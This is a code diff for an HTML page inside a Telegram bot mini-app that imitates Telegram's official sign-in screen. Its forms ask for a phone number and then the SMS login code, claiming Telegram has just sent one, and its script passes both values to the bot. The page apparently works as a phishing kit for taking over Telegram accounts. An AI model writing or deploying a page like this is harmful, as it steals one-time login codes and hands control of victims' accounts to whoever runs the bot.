@@ -2,69 +2,96 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Telegram Sign-In</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         body {
             font-family: Arial, sans-serif;
             text-align: center;
-            padding: 50px;
-        }
-        .logo {
-            margin-bottom: 20px;
+            padding: 20px;
+            background-color: #f9f9f9;
         }
         .form-group {
-            margin: 20px 0;
+            margin: 15px 0;
         }
-        .form-group input, .form-group select {
+        select, input[type="tel"] {
             width: 100%;
             padding: 10px;
+            font-size: 16px;
             margin-top: 5px;
         }
-        .form-group button {
+        button {
             padding: 10px 20px;
             background-color: #0088cc;
             color: white;
             border: none;
             cursor: pointer;
+            font-size: 16px;
+        }
+        .flags {
+            margin-right: 10px;
         }
     </style>
 </head>
 <body>
 
-    <div class="logo">
-        <img src="https://telegram.org/img/t_logo.png" alt="Telegram Logo" width="100">
-    </div>
     <h2>Sign in to Telegram</h2>
     <form id="signin-form">
         <div class="form-group">
             <label for="country">Country</label>
             <select id="country">
-                <option value="Australia">Australia</option>
-                <!-- Add more countries here -->
+                <!-- Add more countries and flags -->
+                <option value="+1" data-flag="🇺🇸">United States (+1)</option>
+                <option value="+44" data-flag="🇬🇧">United Kingdom (+44)</option>
+                <option value="+91" data-flag="🇮🇳">India (+91)</option>
+                <option value="+61" data-flag="🇦🇺">Australia (+61)</option>
+                <!-- Add more options for all countries -->
             </select>
         </div>
         <div class="form-group">
             <label for="phone">Phone Number</label>
-            <input type="tel" id="phone" placeholder="+61 -" required>
+            <input type="tel" id="phone" placeholder="Enter your phone number" required>
         </div>
-        <div class="form-group">
-            <button type="submit">NEXT</button>
-        </div>
+        <button type="submit">Verify</button>
     </form>
+
+    <p id="status-message" style="display: none;">Telegram has sent an SMS to your phone number. Please enter the verification code below.</p>
+
+    <form id="verification-form" style="display: none;">
+        <div class="form-group">
+            <label for="verification-code">Verification Code</label>
+            <input type="tel" id="verification-code" placeholder="Enter verification code" required>
+        </div>
+        <button type="submit">Submit Code</button>
+    </form>
+
+    <script>
+        // Handle form submission
+        document.getElementById('signin-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const country = document.getElementById('country').value;
+            const phone = document.getElementById('phone').value;
+
+            // Send data to the bot
+            Telegram.WebApp.sendData(JSON.stringify({ country, phone }));
+
+            // Display status message
+            document.getElementById('status-message').style.display = 'block';
+            document.getElementById('verification-form').style.display = 'block';
+        });
+
+        // Handle verification form submission
+        document.getElementById('verification-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const verificationCode = document.getElementById('verification-code').value;
+
+            // Send the verification code to the bot
+            Telegram.WebApp.sendData(JSON.stringify({ verificationCode }));
+        });
+    </script>
 
 </body>
 </html>
-<script>
-    document.getElementById('signin-form').addEventListener('submit', function(event) {
-        event.preventDefault(); // Stop the form from submitting the normal way
-
-        // Get the values from the form
-        const country = document.getElementById('country').value;
-        const phone = document.getElementById('phone').value;
-
-        // Send this data back to the bot
-        const data = JSON.stringify({ country, phone });
-        Telegram.WebApp.sendData(data); // Sends data to your Telegram bot
-    });
-</script>
